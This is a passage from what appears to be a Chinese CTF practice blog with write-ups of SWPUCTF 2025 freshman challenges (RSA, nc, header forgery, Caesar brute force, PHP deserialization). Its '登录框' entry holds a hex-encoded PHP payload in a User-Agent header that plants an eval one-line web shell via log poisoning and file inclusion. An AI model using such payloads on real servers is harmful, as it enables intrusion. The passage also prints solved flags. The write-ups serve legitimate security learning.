class="built_in">print</span>(<span class="string">"[!] No roots found. Try adjusting m/t or ensure fpylll installed correctly."</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x0 <span class="keyword">in</span> roots:</span><br><span class="line">        p = GCD(p0 + x0, N)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">1</span> &lt; p &lt; N <span class="keyword">and</span> N % p == <span class="number">0</span>:</span><br><span class="line">            q = N // p</span><br><span class="line">            phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">            d = inverse(e, phi)</span><br><span class="line">            m = <span class="built_in">pow</span>(c, d, N)</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"[!] Roots found but failed to recover factor. Something is off."</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure><p>运行就可以得到flag</p><hr><h2 id="⭐️-09-SWPUCTF-2025-秋季新生赛-hello-pwn"><a href="#⭐️-09-SWPUCTF-2025-秋季新生赛-hello-pwn" class="headerlink" title="⭐️ 09 [SWPUCTF 2025 秋季新生赛]hello_pwn"></a>⭐️ 09 [SWPUCTF 2025 秋季新生赛]hello_pwn</h2><p>🚩flag：<code>NSSCTF{90e2cc85-a6b1-44af-92fa-3435ae8f487d}</code></p><p>💡hint：<code>PWN</code> </p><p>🔧tool：<code>nc</code></p><p><strong>题目描述：</strong><br>也许，几乎每一个pwn手解出的第一道题就是nc连接，这就像大家学习编程里的第一个代码Holle World! ，今天，让我们延续这一传统，希望这会是你打pwn之旅的开端。（er bu shi zhong dian）</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">nc node6.anna.nssctf.cn 22340</span><br></pre></td></tr></tbody></table></figure><h2 id="然后基本操作："><a href="#然后基本操作：" class="headerlink" title="然后基本操作："></a>然后基本操作：<br><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cat</span> flag</span><br></pre></td></tr></tbody></table></figure></h2><h2 id="⭐️-10-SWPUCTF-2025-秋季新生赛-SIGN-IN"><a href="#⭐️-10-SWPUCTF-2025-秋季新生赛-SIGN-IN" class="headerlink" title="⭐️ 10 [SWPUCTF 2025 秋季新生赛]SIGN IN!"></a>⭐️ 10 [SWPUCTF 2025 秋季新生赛]SIGN IN!</h2><p>🚩flag：<code>NSSCTF{183864d5-166a-4d57-88f9-417ae9bb8d7b}</code></p><p>💡hint：<code>WEB</code> </p><p>🔧tool：<code>burpsuite</code></p><p>看起来很好玩的一道web题目：<br><img src="https://a1.boltp.com/2026/02/02/69807a2eacbc0.png" alt="机器人http头web"></p><p>进入burpsuite抓包并修改：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">GET /?check=1 HTTP/1.1</span><br><span class="line">Host: node1.anna.nssctf.cn:25647</span><br><span class="line">Accept-Language: zh-CN</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: CTF-Robot/1.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: https://ctf.example.com</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Cookie: PHPSESSID=de85f9f7ff4da20679a6bfc59e2a9614;session=valid_user</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></tbody></table></figure><p>注意cookie这里要带上原来的，不然会回到第一关。<br>第二关通过后，重复提交，才能通过第三关。<br><img src="https://a1.boltp.com/2026/02/02/69807d219b4c1.png" alt="得到最终flag"></p><hr><h2 id="⭐️-11-SWPUCTF-2025-秋季新生赛-easyCaesar"><a href="#⭐️-11-SWPUCTF-2025-秋季新生赛-easyCaesar" class="headerlink" title="⭐️ 11 [SWPUCTF 2025 秋季新生赛]easyCaesar"></a>⭐️ 11 [SWPUCTF 2025 秋季新生赛]easyCaesar</h2><p>🚩flag：<code>NSSCTF{Y0u_pASs_tHis_LeVel}</code></p><p>💡hint：<code>古典密码</code> <code>凯撒密码</code></p><p>🔧tool：<code>python</code></p><p>题目：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shift_char</span>(<span class="params">ch: <span class="built_in">str</span>, shift: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">if</span> ch.islower():</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">chr</span>((<span class="built_in">ord</span>(ch) - <span class="built_in">ord</span>(<span class="string">'a'</span>) + shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">'a'</span>))</span><br><span class="line">    <span class="keyword">elif</span> ch.isupper():</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">chr</span>((<span class="built_in">ord</span>(ch) - <span class="built_in">ord</span>(<span class="string">'A'</span>) + shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">'A'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> ch</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_flag</span>(<span class="params">flag: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    parts = flag.split(<span class="string">'_'</span>)</span><br><span class="line">    encoded_parts = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> part <span class="keyword">in</span> parts:</span><br><span class="line">        shift = random.randint(<span class="number">1</span>, <span class="number">9</span>)</span><br><span class="line">        encoded = <span class="string">''</span>.join(shift_char(ch, shift) <span class="keyword">for</span> ch <span class="keyword">in</span> part)</span><br><span class="line">        encoded_parts.append(encoded)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">'_'</span>.join(encoded_parts)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    random.seed()</span><br><span class="line">    flag = <span class="string">'**********'</span></span><br><span class="line">    encoded_flag = encode_flag(flag)</span><br><span class="line">    <span class="built_in">print</span>(encoded_flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># encode_flag = 'QVVFWI{B0x_vGYy_aOpz_NgXgn}'</span></span><br></pre></td></tr></tbody></table></figure><p>关键信息：<br>1️⃣ 按 _ 分段<br>parts = flag.split(‘_’)<br>说明：<br>每个 _ 两边是独立加密的<br>_ 本身 不加密<br>2️⃣ 每一段用一个 Caesar（凯撒）移位<br>shift = random.randint(1, 9)<br>encoded = ‘’.join(shift_char(ch, shift) for ch in part)<br>每一段：<br>随机选一个 shift ∈ [1, 9]<br>对字母做循环移位<br>数字、{} 不变<br>👉 这是一个 Caesar cipher，而且 shift 范围极小</p><p>因此暴力破解很轻松<br>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">"QVVFWI{B0x_vGYy_aOpz_NgXgn}"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unshift_char</span>(<span class="params">ch: <span class="built_in">str</span>, shift: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'a'</span> &lt;= ch &lt;= <span class="string">'z'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">chr</span>((<span class="built_in">ord</span>(ch) - <span class="built_in">ord</span>(<span class="string">'a'</span>) - shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">'a'</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'A'</span> &lt;= ch &lt;= <span class="string">'Z'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">chr</span>((<span class="built_in">ord</span>(ch) - <span class="built_in">ord</span>(<span class="string">'A'</span>) - shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">'A'</span>))</span><br><span class="line">    <span class="keyword">return</span> ch</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_part</span>(<span class="params">part: <span class="built_in">str</span>, shift: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(unshift_char(ch, shift) <span class="keyword">for</span> ch <span class="keyword">in</span> part)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 简单打分：更像 flag/英文的得分更高</span></span><br><span class="line">COMMON = {</span><br><span class="line">    <span class="string">"NSSCTF"</span>, <span class="string">"CTF"</span>, <span class="string">"flag"</span>, <span class="string">"this"</span>, <span class="string">"that"</span>, <span class="string">"cipher"</span>, <span class="string">"crypto"</span>, <span class="string">"box"</span>, <span class="string">"hello"</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">score_text</span>(<span class="params">s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    sc = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 字符集正常（字母/数字/{}_-）加分</span></span><br><span class="line">    ok = <span class="built_in">set</span>(string.ascii_letters + string.digits + <span class="string">"{}_-"</span>)</span><br><span class="line">    sc += <span class="built_in">sum</span>(<span class="number">1</span> <span class="keyword">for</span> ch <span class="keyword">in</span> s <span class="keyword">if</span> ch <span class="keyword">in</span> ok)</span><br><span class="line">    <span class="comment"># 出现常见关键词加分（忽略大小写）</span></span><br><span class="line">    low = s.lower()</span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> COMMON:</span><br><span class="line">        <span class="keyword">if</span> w.lower() <span class="keyword">in</span> low:</span><br><span class="line">            sc += <span class="number">20</span></span><br><span class="line">    <span class="comment"># flag 前缀强约束</span></span><br><span class="line">    <span class="keyword">if</span> s.startswith(<span class="string">"NSSCTF{"</span>):</span><br><span class="line">        sc += <span class="number">200</span></span><br><span class="line">    <span class="keyword">if</span> s.endswith(<span class="string">"}"</span>):</span><br><span class="line">        sc += <span class="number">30</span></span><br><span class="line">    <span class="comment"># 下划线段落结构合理加分</span></span><br><span class="line">    sc += s.count(<span class="string">"_"</span>) * <span class="number">5</span></span><br><span class="line">    <span class="keyword">return</span> sc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parts = cipher.split(<span class="string">"_"</span>)</span><br><span class="line">    candidates = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 每段列出 1..9 的候选</span></span><br><span class="line">    per_part = []</span><br><span class="line">    <span class="keyword">for</span> i, part <span class="keyword">in</span> <span class="built_in">enumerate</span>(parts):</span><br><span class="line">        opts = []</span><br><span class="line">        <span class="keyword">for</span> sh <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">            opts.append((sh, decode_part(part, sh)))</span><br><span class="line">        per_part.append(opts)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 打印每段候选，方便人工看</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"=== Per-part candidates ==="</span>)</span><br><span class="line">    <span class="keyword">for</span> i, opts <span class="keyword">in</span> <span class="built_in">enumerate</span>(per_part):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"\n[Part <span class="subst">{i}</span>] cipher = <span class="subst">{parts[i]}</span>"</span>)</span><br><span class="line">        <span class="keyword">for</span> sh, txt <span class="keyword">in</span> opts:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"  shift=<span class="subst">{sh}</span>: <span class="subst">{txt}</span>"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 全组合搜索（段数一般很少，9^n 很小）</span></span><br><span class="line">    best = <span class="literal">None</span></span><br><span class="line">    best_sc = -<span class="number">10</span>**<span class="number">9</span></span><br><span class="line">    <span class="keyword">for</span> choice <span class="keyword">in</span> product(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>), repeat=<span class="built_in">len</span>(parts)):</span><br><span class="line">        dec_parts = [decode_part(parts[i], choice[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(parts))]</span><br><span class="line">        plain = <span class="string">"_"</span>.join(dec_parts)</span><br><span class="line">        sc = score_text(plain)</span><br><span class="line">        <span class="keyword">if</span> sc &gt; best_sc:</span><br><span class="line">            best_sc = sc</span><br><span class="line">            best = (choice, plain, sc)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"\n=== Best guess ==="</span>)</span><br><span class="line">    shifts, plain, sc = best</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"shifts ="</span>, shifts)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"score  ="</span>, sc)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"plain  ="</span>, plain)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure><p>运行得到：<br>NSSCTF{Y0u_pASs_tHis_LeVel}</p><hr><h2 id="⭐️-12-SWPUCTF-2025-秋季新生赛-登录框"><a href="#⭐️-12-SWPUCTF-2025-秋季新生赛-登录框" class="headerlink" title="⭐️ 12 [SWPUCTF 2025 秋季新生赛]登录框"></a>⭐️ 12 [SWPUCTF 2025 秋季新生赛]登录框</h2><p>💡hint：<code>web</code> <code>凯撒密码</code></p><p>🔧tool：<code>burpsuite</code></p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">POST /123123123 HTTP/1.1</span><br><span class="line">Host: node1.anna.nssctf.cn:29521</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Referer: http://node1.anna.nssctf.cn:29521/</span><br><span class="line">Origin: http://node1.anna.nssctf.cn:29521</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: &lt;?php system(hex2bin('6563686f20223c3f70687020406576616c285c245f504f53545b315d293b706870696e666f28293b3f3e22203e202f7661722f7777772f68746d6c2f77702d636f6e74656e742f636f6e6669672e7068703b'));?&gt;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Length: 2</span><br></pre></td></tr></tbody></table></figure><p>然后访问</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">GET /file.php?file_path=/var/log/nginx/access.log HTTP/1.1</span><br><span class="line">Host: node1.anna.nssctf.cn:29521</span><br><span class="line">Accept-Language: zh-CN</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36</span><br><span class="line">Accept: */*</span><br><span class="line">Referer: http://node1.anna.nssctf.cn:29521/R34d.php</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>即可实现在./wp-content/config.php写上一个密码为1的一句话木马<br>（还没完全做出来）</p><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-SWPUCTF2025秋季新生赛2</title>
      <link href="/2026/02/01/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B2/"/>
      <url>/2026/02/01/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B2/</url>
      
        <content type="html"><![CDATA[<p><em>题目来源：NSSCTF</em></p><p><em>练习时间：2026年2月1日</em></p><p><em>练习数量：5</em></p><p>上篇：<a href="https://sereniusx.github.io/2026/01/31/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B1/">CTF-SWPUCTF2025秋季新生赛1</a><br>下篇：<a href="https://sereniusx.github.io/2026/02/02/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B3/">CTF-SWPUCTF2025秋季新生赛3</a></p><p>📖 <strong>SWPUCTF 2025 秋季新生赛合集</strong>：<br>1️⃣<a href="https://sereniusx.github.io/2026/01/31/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B1/">CTF-SWPUCTF2025秋季新生赛1</a><br>2️⃣<a href="https://sereniusx.github.io/2026/02/01/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B2/">CTF-SWPUCTF2025秋季新生赛2</a><br>3️⃣<a href="https://sereniusx.github.io/2026/02/02/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B3/">CTF-SWPUCTF2025秋季新生赛3</a><br>4️⃣<a href="https://sereniusx.github.io/2026/02/03/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B4/">CTF-SWPUCTF2025秋季新生赛4</a><br>5️⃣<a href="https://sereniusx.github.io/2026/02/04/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B5/">CTF-SWPUCTF2025秋季新生赛5</a></p><h2 id="⭐️-03-SWPUCTF-2025-秋季新生赛-一种很新的签到"><a href="#⭐️-03-SWPUCTF-2025-秋季新生赛-一种很新的签到" class="headerlink" title="⭐️ 03 [SWPUCTF 2025 秋季新生赛]一种很新的签到"></a>⭐️ 03 [SWPUCTF 2025 秋季新生赛]一种很新的签到</h2><p>🚩flag：<code>NSSCTF{Welcome_To_NSS_Reverse_Challenge!!}</code></p><p>💡hint：<code>reverse</code> </p><p>🔧tool：<code>ida-pro</code></p><p>下载附件后用ida-pro打开，第一步，打开：</p><figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">View</span> → <span class="keyword">Open</span> subviews → Strings</span><br></pre></td></tr></tbody></table></figure><p>然后搜索<br>用 ⌘ + F 查找关键字 <code>NSSCTF</code> 得到flag。</p><p><img src="https://a1.boltp.com/2026/02/01/697ed43c95581.png" alt="ida-pro界面"></p><hr><h2 id="⭐️-04-SWPUCTF-2025-秋季新生赛-FIRST-MEETING"><a href="#⭐️-04-SWPUCTF-2025-秋季新生赛-FIRST-MEETING" class="headerlink" title="⭐️ 04 [SWPUCTF 2025 秋季新生赛]FIRST MEETING"></a>⭐️ 04 [SWPUCTF 2025 秋季新生赛]FIRST MEETING</h2><p>🚩flag：<code>NSSCTF{af957930-79c2-4697-961b-fafb66b2041f}</code></p><p>💡hint：<code>web</code> <code>PHP 反序列化漏洞</code> <code>POP 链利用（Property Oriented Programming）</code></p><p>🔧tool：<code>php运行工具/环境</code></p><p>原题奉上：</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WEB</span> </span>{</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sauy</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$creambread</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$sauy</span></span>) </span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sauy = <span class="variable">$sauy</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"I know you are good at this!"</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; sauy;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">REVERSE</span> </span>{</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$re1sen</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$harukaze</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ysyy</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$acc</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>{</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span> -&gt; harukaze) ||!<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span> -&gt; ysyy)||(<span class="variable language_">$this</span> -&gt; harukaze === <span class="variable language_">$this</span> -&gt; ysyy)) {</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"你输的什么东西?"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span> -&gt; harukaze) == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span> -&gt; ysyy)) {</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;acc)();</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"?"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PWN</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wings</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c0trick</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>{</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;wings === <span class="string">'SHENG-YI'</span>){</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; c0trick -&gt; <span class="title function_ invoke__">MinatoNamikaze</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"NSS WELCOME YOU!!!"</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"No wings,no fly!"</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MISC</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cr4p</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; cr4p -&gt; png = <span class="string">'010'</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CRYPTO</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kyarihoshi</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rocage</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$last</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dance</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kiss</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable">$kyarihoshi</span> = <span class="variable language_">$this</span> -&gt; kyarihoshi;</span><br><span class="line">        <span class="variable">$rocage</span> = <span class="variable language_">$this</span> -&gt; rocage;</span><br><span class="line">        <span class="variable">$kiss</span> = <span class="variable language_">$this</span> -&gt; kiss;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; dance = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;last === <span class="variable language_">$this</span> -&gt; dance){</span><br><span class="line">            <span class="variable">$kiss</span> = <span class="keyword">new</span> <span class="variable language_">$this</span> -&gt; <span class="title function_ invoke__">kyarihoshi</span>(<span class="variable">$this</span> -&gt; rocage);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"<span class="subst">$kiss</span>&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"恭喜！&lt;br&gt;"</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span>{</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"LAST DANCE!May be you can find the trick!"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="variable">$NSS</span> = <span class="variable">$_POST</span>[<span class="string">"NSS"</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$NSS</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>漏洞点：<code>unserialize</code>会把用户输入还原为对象或者数组。</p><p>对于web：</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WEB</span> </span>{</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sauy</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sauy;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>当 unserialize() 结束、脚本生命周期结束时，WEB 对象会析构，自动执行 __destruct()。<br>它做了一个关键动作：echo $this-&gt;sauy;<br>如果 $sauy 是字符串：就打印字符串<br>如果 $sauy 是对象：PHP 会尝试把对象转成字符串 → 触发 __toString()</p><p>进入pwn：</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PWN</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wings</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c0trick</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>{</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;wings === <span class="string">'SHENG-YI'</span>){</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;c0trick-&gt;<span class="title function_ invoke__">MinatoNamikaze</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"NSS WELCOME YOU!!!"</span>;</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"No wings,no fly!"</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这里两件事：<br>要求 $wings === ‘SHENG-YI’（严格相等）<br>→ 逼你在 payload 里把属性填对<br>调用一个根本不存在的方法：<br>$this-&gt;c0trick-&gt;MinatoNamikaze();<br>对一个对象调用不存在的方法，会触发该对象的 __call($name,$args)</p><p>然后会跳到reverse：</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">REVERSE</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$harukaze</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ysyy</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$acc</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>{</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;harukaze) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;ysyy) || (<span class="variable language_">$this</span>-&gt;harukaze === <span class="variable language_">$this</span>-&gt;ysyy)) {</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"你输的什么东西?"</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;harukaze) == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;ysyy)) {</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;acc)();</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span 